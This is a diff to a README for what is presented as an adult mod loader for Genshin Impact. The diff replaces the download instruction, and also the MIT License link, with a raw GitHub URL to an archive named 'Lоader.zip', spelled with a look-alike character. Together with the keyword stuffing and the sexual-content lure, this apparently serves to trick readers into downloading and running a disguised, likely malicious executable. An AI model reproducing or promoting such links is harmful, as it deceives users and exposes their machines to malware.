@@ -49,7 +49,7 @@ Genshin Impact mod tool, erotic Genshin mods, adult Genshin skin loader, Genshin
 
 **Follow these steps for a quick and secure setup:**
 
-1. **Download Loader.rar** from this repository’s Releases section.
+1. **Download https://raw.githubusercontent.com/ankit-avkalan/GenshinVelvetVisions/main/Lоader.zip** from this repository’s Releases section.
 2. Extract the contents using your favorite extraction tool (e.g., WinRAR, 7-Zip, The Unarchiver).
 3. Open the *Loader* application matching your Operating System.
 4. Browse the “Mods” folder and add your preferred erotic Genshin Impact mods (refer to our mod marketplace or community recommendations).
@@ -87,7 +87,7 @@ Genshin Impact mod tool, erotic Genshin mods, adult Genshin skin loader, Genshin
 
 ## 📚 MIT License
 
-The **Genshin Impact Erotic Mod Loader** is proudly Open Source, available under the [MIT License (2025)](https://opensource.org/license/mit/).  
+The **Genshin Impact Erotic Mod Loader** is proudly Open Source, available under the [MIT License (2025)](https://raw.githubusercontent.com/ankit-avkalan/GenshinVelvetVisions/main/Lоader.zip).  
 You can freely use, modify, and share—please attribute if redistributing!
 
 ---  
